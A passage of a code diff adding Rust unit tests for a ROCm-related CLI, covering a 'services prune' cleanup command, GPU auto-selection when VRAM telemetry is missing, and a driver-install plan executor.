+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let dead_exists = paths.service_manifest_path("svc-dead").exists();
+        let running_exists = paths.service_manifest_path("svc-running").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(!dead_exists, "the stopped record must be pruned");
+        assert!(running_exists, "a running record must be left alone");
+        assert_eq!(outcome.removed_records, 1);
+        assert_eq!(outcome.skipped_live, 1);
+        assert!(
+            outcome.text.contains("  still running, left alone: 1"),
+            "prune must report how many records it skipped:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome
+                .text
+                .contains("rocm services stop svc-running --yes"),
+            "the skip reason must name the stop command:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// The engine state file lives outside `services_dir`, so hand-deleting the
+    /// manifest and log — the workaround this command replaces — leaves it
+    /// behind forever. Prune has to sweep it.
+    #[test]
+    fn services_prune_sweeps_engine_state_left_behind_by_a_deleted_record() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-orphans");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-orphaned", "failed", 999_999_999)?;
+        // Exactly what the manual workaround leaves: the two files in the
+        // services folder are gone, the engine state and endpoint key are not.
+        fs::remove_file(&record.manifest_path)?;
+        let orphan_state = record.engine_state_path;
+        let orphan_log = record.log_path;
+        let orphan_key = endpoint_keys::endpoint_key_file_path(&paths, "svc-orphaned");
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let state_exists = orphan_state.exists();
+        let log_exists = orphan_log.exists();
+        let key_exists = orphan_key.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            !state_exists,
+            "the orphaned engine state file must be swept:\n{}",
+            outcome.text
+        );
+        assert!(!log_exists, "the orphaned log must be swept");
+        assert!(!key_exists, "the orphaned endpoint key must be swept");
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 3);
+        Ok(())
+    }
+
+    #[test]
+    fn services_prune_dry_run_reports_the_plan_and_removes_nothing() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-dry-run");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-dry", "failed", 999_999_999)?;
+
+        let outcome = prune_managed_service_records(&paths, 0, true, false);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let engine_state_exists = record.engine_state_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(manifest_exists, "--dry-run must not delete the record");
+        assert!(engine_state_exists, "--dry-run must not delete anything");
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 0);
+        assert!(outcome.text.contains("- svc-dry (status: failed"));
+        assert!(
+            outcome
+                .text
+                .contains("Nothing was removed. Re-run without --dry-run to remove.")
+        );
+        Ok(())
+    }
+
+    /// The `--all` view advertises `rocm services restart <id> --yes` for every
+    /// record it lists. Pruning a server that died a minute ago would destroy
+    /// that affordance and the log explaining the failure, so the default age
+    /// gate keeps it.
+    #[test]
+    fn services_prune_default_age_keeps_a_just_stopped_record() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-age");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let outcome =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "a record written seconds ago must survive the default prune:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 0);
+        assert!(
+            outcome
+                .text
+                .contains("svc-fresh changed less than 24 hours ago"),
+            "prune must say why it was kept:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// The age gate reads the manifest's modification time, and
+    /// `load_managed_services` rewrites that manifest the first time it observes
+    /// that a `ready` server has died — a crash, a kill, a reboot. Read after
+    /// that rewrite the record looks newer than the prune run itself, so the
+    /// fail-closed branch keeps it: on a host whose servers died weeks ago and
+    /// have not been listed since, `rocm services prune --yes` removed nothing
+    /// at all and called every one of them too recent to touch.
+    #[test]
+    fn services_prune_default_age_removes_a_record_the_refresh_rewrote() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-refresh-rewrite");
+        paths.ensure()?;
+        // `ready` with a dead pid is the state that triggers the rewrite: the
+        // liveness refresh demotes the status and persists the demotion.
+        let record = plant_service_record(&paths, "svc-long-dead", "ready", 999_999_999)?;
+        let month_ago = SystemTime::now() - Duration::from_hours(24 * 30);
+        fs::File::options()
+            .write(true)
+            .open(&record.manifest_path)?
+            .set_modified(month_ago)?;
+
+        let outcome =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            !manifest_exists,
+            "a record last written a month ago must be pruned even though the \
+             liveness refresh rewrote its manifest during this run:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 1);
+        assert_eq!(
+            outcome.skipped_recent, 0,
+            "the refresh's own rewrite must not make a month-old record recent:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// A cleanup that keeps things silently is indistinguishable from one that
+    /// found nothing, and what it keeps is exactly what a user debugging a fresh
+    /// failure still wants. The count and the way to override it both have to be
+    /// on screen.
+    #[test]
+    fn services_prune_says_how_many_it_kept_for_being_recent() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-recent-report");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let outcome =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let _ = fs::remove_dir_all(&root);
+
+        assert_eq!(outcome.skipped_recent, 1);
+        assert!(
+            outcome.text.contains("  too recent, kept: 1"),
+            "the summary must count what it kept:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome.text.contains("rocm services prune --any-age --yes"),
+            "the summary must name the flag that includes them:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// Parse a real `rocm services prune` command line and return exactly what
+    /// the dispatch at `ServicesCommand::Prune` would hand
+    /// [`prune_managed_service_records`]. Nothing here re-implements the flag
+    /// mapping: it runs [`service_prune_min_age_hours`], the same function the
+    /// command uses, so a test driving this covers the wiring and not a copy of
+    /// it.
+    fn parse_services_prune_args(argv: &[&str]) -> Result<(u64, bool, bool)> {
+        let cli = Cli::try_parse_from(argv)?;
+        let Some(Command::Services {
+            command:
+                Some(ServicesCommand::Prune {
+                    older_than_hours,
+                    any_age,
+                    dry_run,
+                    yes,
+                }),
+        }) = cli.command
+        else {
+            bail!("{argv:?} did not parse as `services prune`");
+        };
+        Ok((
+            service_prune_min_age_hours(older_than_hours, any_age),
+            dry_run,
+            yes,
+        ))
+    }
+
+    /// `--any-age` is the reachable form of `--older-than-hours 0`: the summary
+    /// points at it, so it has to actually take the record the default kept.
+    ///
+    /// Driven from the argument vector rather than by passing 0 by hand —
+    /// otherwise this is just another call with `hours = 0` and the flag's only
+    /// wiring, the collapse in [`service_prune_min_age_hours`], is never
+    /// executed by any test.
+    #[test]
+    fn services_prune_any_age_removes_a_just_stopped_record() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-any-age");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let outcome =
+            parse_services_prune_args(&["rocm", "services", "prune", "--any-age", "--yes"])
+                .and_then(|(hours, dry_run, yes)| {
+                    assert_eq!(hours, 0, "--any-age must collapse to the zero-age rule");
+                    assert!(!dry_run);
+                    assert!(yes);
+                    prune_managed_service_records(&paths, hours, dry_run, yes)
+                });
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            !manifest_exists,
+            "--any-age must remove the record the default keeps:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 1);
+        assert_eq!(
+            outcome.skipped_recent, 0,
+            "nothing is 'too recent' once the age rule is off:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// Without the flag the very same parsed command line must keep the record,
+    /// which is what makes the assertion above about `--any-age` and not about
+    /// prune deleting things in general.
+    #[test]
+    fn services_prune_without_any_age_keeps_the_default_threshold() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-no-any-age");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let parsed = parse_services_prune_args(&["rocm", "services", "prune", "--yes"]);
+        let outcome = parsed.and_then(|(hours, dry_run, yes)| {
+            assert_eq!(
+                hours, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS,
+                "no --any-age means the default age rule still applies"
+            );
+            prune_managed_service_records(&paths, hours, dry_run, yes)
+        });
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "the default must keep it:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.skipped_recent, 1);
+        Ok(())
+    }
+
+    /// `--any-age` and an explicit `--older-than-hours` would be two answers to
+    /// one question; clap has to reject the pair rather than silently pick one.
+    #[test]
+    fn services_prune_rejects_any_age_with_an_explicit_age() {
+        let error = Cli::try_parse_from([
+            "rocm",
+            "services",
+            "prune",
+            "--any-age",
+            "--older-than-hours",
+            "5",
+        ])
+        .expect_err("the two age arguments must conflict");
+        let rendered = error.to_string();
+        assert!(
+            rendered.contains("--any-age") && rendered.contains("--older-than-hours"),
+            "the conflict must name both arguments:\n{rendered}"
+        );
+    }
+
+    /// `collect_service_orphans`' doc comment leans on this: an *unparseable*
+    /// manifest is skipped by `load_managed_services`, so widening the orphan
+    /// rule from "no `<id>.json` on disk" to "no record in the list" would
+    /// delete the log of the one record a user most needs to read, and the
+    /// corrupt manifest with it. Nothing asserted that until now — the other
+    /// tests only ever plant a fully absent manifest.
+    #[test]
+    fn services_prune_keeps_a_corrupt_manifest_and_its_siblings() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-corrupt");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-corrupt", "failed", 999_999_999)?;
+        // Valid JSON, not a valid record: `serde_json::from_slice` fails, so
+        // `load_managed_services` skips it without reporting an error.
+        fs::write(&record.manifest_path, b"{\"service_id\": 12345}")?;
+        let key_path = endpoint_keys::endpoint_key_file_path(&paths, "svc-corrupt");
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let log_exists = record.log_path.exists();
+        let state_exists = record.engine_state_path.exists();
+        let key_exists = key_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "a manifest that cannot be parsed must never be deleted:\n{}",
+            outcome.text
+        );
+        assert!(
+            log_exists,
+            "the log of an unreadable record is exactly what a user needs:\n{}",
+            outcome.text
+        );
+        assert!(state_exists, "the engine state must not look orphaned");
+        assert!(key_exists, "the endpoint key must not look orphaned");
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 0);
+        Ok(())
+    }
+
+    /// The status string is not proof of death. `refresh_from_engine_state`
+    /// adopts `failed` straight from the engine's own state file and the
+    /// liveness refresh then returns early for a non-live status, so a server
+    /// whose engine reported failure while its process is still up would be
+    /// removable — taking the log and the 0600 endpoint key of a live process.
+    #[test]
+    fn services_removal_refuses_a_failed_record_whose_process_is_still_alive() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-live-pid");
+        paths.ensure()?;
+        // This test process: a pid that is unambiguously running.
+        let record = plant_service_record(&paths, "svc-zombie", "failed", std::process::id())?;
+
+        let remove_error = remove_managed_service_record(&paths, "svc-zombie", true);
+        let prune = prune_managed_service_records(&paths, 0, false, true);
+        let prune = match prune {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = remove_error
+            .err()
+            .map(|error| error.to_string())
+            .unwrap_or_default();
+        assert!(
+            message.contains("cannot be removed while it is running"),
+            "a record with a live pid must be refused whatever its status: {message}"
+        );
+        assert!(manifest_exists, "nothing may be deleted:\n{}", prune.text);
+        assert_eq!(prune.removed_records, 0);
+        assert_eq!(
+            prune.skipped_live, 1,
+            "prune must count it as still running:\n{}",
+            prune.text
+        );
+        Ok(())
+    }
+
+    /// A file `prune` cannot delete must be *reported*, not swallowed and not
+    /// propagated: the plan, the per-record progress and the audit event all
+    /// have to survive it, because a destructive command that loses its own
+    /// account of what it deleted is worse than one that fails. The record whose
+    /// file survived also must not be counted as removed.
+    ///
+    /// A non-empty directory standing where the engine state file belongs is the
+    /// portable way to make `fs::remove_file` fail on both supported hosts; the
+    /// premise is asserted rather than assumed.
+    #[test]
+    fn services_prune_reports_a_file_it_could_not_remove() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-undeletable");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-stuck", "failed", 999_999_999)?;
+        let stuck = record.engine_state_path.clone();
+        fs::remove_file(&stuck)?;
+        fs::create_dir(&stuck)?;
+        fs::write(stuck.join("held.json"), b"{}")?;
+        assert!(
+            fs::remove_file(&stuck).is_err(),
+            "premise: {} must be undeletable by `remove_file`",
+            stuck.display()
+        );
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let stuck_exists = stuck.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(stuck_exists, "premise: the stuck path must survive");
+        assert!(
+            !manifest_exists,
+            "one unremovable file must not strand the other three:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_files, 3);
+        assert_eq!(
+            outcome.removed_records, 0,
+            "a record that still owns a file on disk is not removed:\n{}",
+            outcome.text
+        );
+        assert_eq!(
+            outcome.failures.len(),
+            1,
+            "the failure must be collected so the caller can fail the command:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome.failures[0].contains(&stuck.display().to_string()),
+            "the failure must name the path: {:?}",
+            outcome.failures
+        );
+        assert!(
+            outcome
+                .text
+                .contains("1 local server record(s) would be removed"),
+            "the plan must still be rendered:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome.text.contains("1 file(s) could not be removed:"),
+            "the run must say what it could not delete:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome
+                .text
+                .contains("Re-running is safe: everything already removed stays removed."),
+            "the user needs to know a re-run is not destructive twice over:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// The window the pre-delete liveness re-check exists to narrow: the plan is
+    /// built from a snapshot, and a `rocm services restart <id> --yes` landing
+    /// between that snapshot and the delete would otherwise have its log and its
+    /// 0600 endpoint key deleted out from under a serving process.
+    ///
+    /// Driven through [`apply_service_prune_plan`] with a hand-built plan
+    /// because the window cannot be opened from outside: `prune` builds and
+    /// applies the plan in one call, so a record is either live for both halves
+    /// or dead for both. The two `skipped_live` assertions elsewhere in this
+    /// module both plant an already-live record, which is satisfied by the
+    /// *plan-building* skip and never reaches this branch.
+    #[test]
+    fn services_prune_leaves_a_record_that_restarted_after_the_plan_was_built() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-relaunched");
+        paths.ensure()?;
+        // Live at apply time. The current process is a guaranteed-live pid.
+        let record = plant_service_record(&paths, "svc-relaunched", "ready", std::process::id())?;
+        // The entry a plan built moments earlier, while the record was still
+        // stopped, would carry into the delete loop.
+        let artifacts = match service_record_artifacts(&paths, "svc-relaunched", "vllm") {
+            Ok(artifacts) => artifacts,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let plan = ServicePrunePlan {
+            remove: vec![ServicePruneEntry {
+                service_id: "svc-relaunched".to_owned(),
+                engine: "vllm".to_owned(),
+                status: "stopped".to_owned(),
+                artifacts,
+            }],
+            ..ServicePrunePlan::default()
+        };
+
+        let mut outcome = ServicePruneOutcome::default();
+        apply_service_prune_plan(&paths, &plan, &mut outcome);
+        let manifest_exists = record.manifest_path.exists();
+        let log_exists = record.log_path.exists();
+        let key_exists = endpoint_keys::endpoint_key_file_path(&paths, "svc-relaunched").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "a record that came back to life must not be deleted:\n{}",
+            outcome.text
+        );
+        assert!(
+            log_exists,
+            "the log of a live process must survive:\n{}",
+            outcome.text
+        );
+        assert!(
+            key_exists,
+            "the 0600 endpoint key of a live process must survive:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 0);
+        assert_eq!(
+            outcome.skipped_live, 1,
+            "the re-check's skip must be counted like any other:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome
+                .text
+                .contains("  svc-relaunched started again while this ran and was left alone."),
+            "the skip must be on screen, not silent:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// `prunable_by_modified` promises to fail *closed*: a modification time
+    /// that yields no age — a file stamped in the future by clock skew or a
+    /// stray `touch` — is kept, and only the explicit zero-age opt-out overrides
+    /// that. Neither half was asserted anywhere: every other test plants a
+    /// readable past time, for which `is_some_and` and `is_none_or` agree and
+    /// the `min_age.is_zero()` early return is unreachable.
+    #[test]
+    fn services_prune_keeps_a_future_dated_record_until_any_age() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-future-mtime");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-future", "failed", 999_999_999)?;
+        // `now.duration_since(future)` is an error, so `age_from_modified` has
+        // no age to compare against the threshold.
+        let backdate = |to: SystemTime| -> Result<()> {
+            fs::File::options()
+                .write(true)
+                .open(&record.manifest_path)?
+                .set_modified(to)?;
+            Ok(())
+        };
+        let next_year = SystemTime::now() + Duration::from_hours(24 * 365);
+        backdate(next_year)?;
+        assert!(
+            age_from_modified(path_modified(&record.manifest_path), SystemTime::now()).is_none(),
+            "premise: a future-stamped manifest must have no age"
+        );
+
+        let kept =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let kept = match kept {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let kept_manifest = record.manifest_path.exists();
+
+        // Re-stamped so the second run really does meet the no-age case rather
+        // than a time the first run's refresh may have rewritten to `now`.
+        // Ignored rather than `?`-ed: if the first run wrongly deleted the
+        // manifest there is nothing left to stamp, and the `kept_manifest`
+        // assertion below has to be what reports that, not an "os error 2".
+        let _ = backdate(next_year);
+        let taken = parse_services_prune_args(&["rocm", "services", "prune", "--any-age", "--yes"])
+            .and_then(|(hours, dry_run, yes)| {
+                assert_eq!(hours, 0, "--any-age must collapse to the zero-age rule");
+                prune_managed_service_records(&paths, hours, dry_run, yes)
+            });
+        let taken = match taken {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let taken_manifest = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            kept_manifest,
+            "a time that cannot be aged must fail closed under the default rule:\n{}",
+            kept.text
+        );
+        assert_eq!(kept.removed_records, 0);
+        assert_eq!(
+            kept.skipped_recent, 1,
+            "the keep must be reported, not silent:\n{}",
+            kept.text
+        );
+        assert!(
+            !taken_manifest,
+            "--any-age is the opt-out that takes it anyway:\n{}",
+            taken.text
+        );
+        assert_eq!(taken.removed_records, 1);
+        assert_eq!(taken.skipped_recent, 0);
+        Ok(())
+    }
+
+    #[test]
+    fn services_prune_requires_yes_unless_dry_run() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-yes");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-prune-yes", "failed", 999_999_999)?;
+
+        let error = prune_managed_service_records(&paths, 0, false, false)
+            .expect_err("prune without --yes must fail");
+        let manifest_exists = paths.service_manifest_path("svc-prune-yes").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = error.to_string();
+        assert!(message.contains("requires --yes"), "unexpected: {message}");
+        assert!(
+            message.contains("rocm services prune --dry-run"),
+            "the error must name the preview command: {message}"
+        );
+        assert!(manifest_exists, "a refused prune must delete nothing");
+        Ok(())
+    }
+
     #[test]
     fn duplicate_managed_launch_detected_across_distinct_service_ids() -> Result<()> {
         // `generate_service_id` embeds a timestamp, so a second launch for the
@@ -28738,6 +30827,102 @@ install therock";
     }
 
     #[test]
+    fn auto_selection_considers_a_detected_gpu_that_reported_no_vram_row() {
+        // A short row set is not always a visibility mask. `parse_gpu_vram_usage`
+        // drops any device entry missing its `used_vram`/`total_vram` pointers, so
+        // here `list` counts two GPUs, both are visible, but only GPU 0 produced a
+        // row — and GPU 0 is pinned by a managed service. Driving candidates from
+        // the rows alone leaves `[0]`, the busy filter empties it, every pass
+        // iterates nothing and the terminal fallback hands back GPU 0: `serve`
+        // pinned to an already-occupied GPU, the exact failure this selection
+        // exists to prevent. The untelemetried GPU 1 is confirmed by both the
+        // count and the visible set, so it must be a candidate and must win.
+        assert_eq!(
+            select_auto_gpu_index(
+                Some(2),
+                Some(&[0, 1]),
+                &[0],
+                Some(&[vram(0, 182_000, 192_000)])
+            ),
+            vec![1],
+            "a detected, visible GPU with no VRAM row must be preferred over a busy reported one"
+        );
+        // The same shape without telemetry for the busy device being conclusive:
+        // GPU 1 is still the only non-busy ordinal either source confirms.
+        assert_eq!(
+            select_auto_gpu_index(
+                Some(2),
+                Some(&[0, 1]),
+                &[0],
+                Some(&[vram(0, 1_000, 192_000)])
+            ),
+            vec![1],
+            "an idle-looking but service-pinned GPU 0 must still lose to the free GPU 1"
+        );
+        // The masking behaviour this rows-only construction was introduced for is
+        // untouched: rows `[2, 3]` against `count == 2` put a row index at or above
+        // the count, which is the proof the ordinal space is re-indexed, so the
+        // union never happens and the rows stand alone. (The visible retain would
+        // also have dropped `0`/`1` here — this pins the row-index rule itself, so
+        // the masked case survives on a host where the mask is unknown too.)
+        let masked = [vram(2, 182_000, 192_000), vram(3, 190_000, 192_000)];
+        assert_eq!(
+            select_auto_gpu_index(Some(2), Some(&[2, 3]), &[2, 3], Some(&masked)),
+            vec![2],
+            "a masked host must not gain candidates 0/1 from the detected count"
+        );
+    }
+
+    #[test]
+    fn auto_selection_considers_an_untelemetried_gpu_when_the_visible_set_is_unknown() {
+        // Same shape as the test above, but `visible` is `None`. That is not an
+        // exotic host: `probe_usable_amd_gpu_indices` returns `None`
+        // *unconditionally* off Linux, and `serve` threads that straight into
+        // `visible`, so every Windows run takes this path — as does any Linux host
+        // whose KFD topology and DRM cards are both unreadable. Gating the
+        // `0..count` union on `visible.is_some()` therefore left the whole bug
+        // standing on a supported platform.
+        //
+        // Nothing about the mask is needed to justify GPU 1 here: the amd-smi
+        // `list` count asserts two devices and the rows name only ordinals below
+        // that count, so the rows are a subset of a dense range, not a re-indexed
+        // one. GPU 0 is pinned by a managed service, so the untelemetried GPU 1 is
+        // the only free ordinal and must win over the busy reported fallback.
+        assert_eq!(
+            select_auto_gpu_index(Some(2), None, &[0], Some(&[vram(0, 182_000, 192_000)])),
+            vec![1],
+            "an unprobeable host must still consider a counted GPU that reported no VRAM row"
+        );
+        // A row index at or above the count is the only evidence available that the
+        // ordinal space is *not* a dense `0..count`, so there the rows stay
+        // authoritative even with no mask to retain against — otherwise an
+        // unprobeable masked host would have `[0, 1]` invented for it.
+        let masked = [vram(2, 182_000, 192_000), vram(3, 190_000, 192_000)];
+        assert_eq!(
+            select_auto_gpu_index(Some(2), None, &[2, 3], Some(&masked)),
+            vec![2],
+            "re-indexed rows must not gain unconfirmed candidates 0/1 from the detected count"
+        );
+        // The count must come from the `list` enumeration to confirm anything.
+        // With `detected` absent it is `rows.len()`, i.e. the rows restating their
+        // own size, and `parse_gpu_vram_usage` can repeat an ordinal: it falls back
+        // to the array position only when an entry has no `gpu` field, so a payload
+        // naming `"gpu": 0` twice yields two index-0 rows. That makes `rows.len()`
+        // 2 with every index below it, and dropping the `detected` half of the
+        // condition would invent a GPU 1 nothing ever enumerated.
+        assert_eq!(
+            select_auto_gpu_index(
+                None,
+                None,
+                &[0],
+                Some(&[vram(0, 182_000, 192_000), vram(0, 182_000, 192_000)])
+            ),
+            vec![0],
+            "a row-derived count must not synthesise an ordinal no source reported"
+        );
+    }
+
+    #[test]
     fn validate_pinned_gpu_index_rejects_out_of_range() {
         // Index equal to or beyond the detected count is rejected.
         let error = validate_pinned_gpu_index(4, Some(4), None, false)
@@ -29337,6 +31522,195 @@ VERSION_CODENAME=noble
     }
 
     #[test]
+    fn driver_plan_executor_runs_verify_after_execute() -> Result<()> {
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", true).driver),
+        )?;
+
+        assert_eq!(observed, ["prepare", "execute", "verify"]);
+        assert!(state.executed_at_unix_ms.is_some());
+        Ok(())
+    }
+
+    #[test]
+    fn driver_plan_executor_defers_verify_when_reboot_is_required() -> Result<()> {
+        let plan = build_driver_install_plan(
+            &test_examine("linux", false),
+            "ID=ubuntu\nVERSION_ID=\"24.04\"\nVERSION_CODENAME=noble\n",
+            true,
+            PrivilegeEscalation::Sudo,
+        );
+        assert!(plan.reboot_required);
+        let expected = plan.execution_commands();
+        let verify_commands = plan
+            .commands
+            .iter()
+            .filter(|command| command.phase == DriverCommandPhase::Verify)
+            .map(|command| command.command.clone())
+            .collect::<Vec<_>>();
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", false).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        let mut observed = Vec::new();
+
+        execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                Ok(())
+            },
+            |_| Ok(()),
+            || Ok(test_examine("linux", false).driver),
+        )?;
+
+        assert_eq!(observed, expected);
+        assert!(
+            verify_commands
+                .iter()
+                .all(|command| !observed.contains(command)),
+            "reboot-gated Verify commands must be deferred: {verify_commands:?}"
+        );
+        assert!(state.executed_at_unix_ms.is_some());
+        assert!(state.reboot_required);
+        Ok(())
+    }
+
+    #[test]
+    fn failed_driver_verify_does_not_mark_execution_completed() -> Result<()> {
+        let (root, paths) = test_paths("driver-verify-failure-state");
+        let mut plan = wsl_rocdxg_driver_plan(PrivilegeEscalation::Sudo);
+        plan.commands = vec![
+            driver_command(DriverCommandPhase::Prepare, "prepare"),
+            driver_command(DriverCommandPhase::Execute, "execute"),
+            driver_command(DriverCommandPhase::Verify, "verify"),
+        ];
+        let mut state = DriverInstallState {
+            approved_at_unix_ms: 1,
+            executed_at_unix_ms: None,
+            pre_driver: test_examine("linux", true).driver,
+            post_driver: None,
+            boot_id_at_execution: Some("boot".to_owned()),
+            reboot_required: plan.reboot_required,
+            reboot_observed: false,
+            commands: plan.execution_commands(),
+            reconciled_at_unix_ms: None,
+            reconciliation: None,
+        };
+        write_driver_install_state(&paths, &state)?;
+        let mut observed = Vec::new();
+        let mut gathered = false;
+
+        let error = execute_driver_install_plan(
+            &plan,
+            &mut state,
+            |command| {
+                observed.push(command.to_owned());
+                if command == "verify" {
+                    bail!("verification rejected the install");
